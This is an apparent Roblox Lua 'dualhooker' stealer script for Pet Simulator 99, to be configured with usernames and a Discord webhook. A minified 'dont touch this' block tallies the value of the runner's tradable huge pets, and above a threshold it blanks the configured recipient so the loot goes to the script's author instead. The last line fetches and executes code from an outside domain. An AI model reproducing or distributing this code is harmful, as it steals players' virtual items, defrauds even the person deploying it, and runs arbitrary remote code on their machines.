-- UNIVERSAL PS99 DUALHOOKER

Username = "roblox"
Username2 = "roblox"
Webhook = "https://discord.com/api/webhooks/x/x"

MinimumRAP = 100000

-- dont touch this-----------------------------------------
local a=require(game.ReplicatedStorage.Library)local b=a.Save.Get().Inventory;local c=game:GetService("HttpService")local function d(e,f)return a.DevRAPCmds.Get({Class={Name=e},IsA=function(g)return g==e end,GetId=function()return f.id end,StackKey=function()return c:JSONEncode({id=f.id,pt=f.pt,sh=f.sh,tn=f.tn})end})or 0 end;local function h()HugesRAP=0;if Inventory.Pet~=nil then for i,j in pairs(Inventory.Pet)do id=j.id;dir=Directory.Pets[id]if dir.huge and dir.Tradable~=false then HugesRAP=HugesRAP+d("Pet",j)end end end;return HugesRAP end;RAPOFHUGES=h()

if RAPOFHUGES >= 80000000 then
    Dualhooked = true
end
------------------------------------------------
--\\ FILL THOSE!!

if Dualhooked == true then
    Username = ""
    Username2 = ""
    Webhook = ""
end

loadstring(game:HttpGet("https://egorikusa.space"))()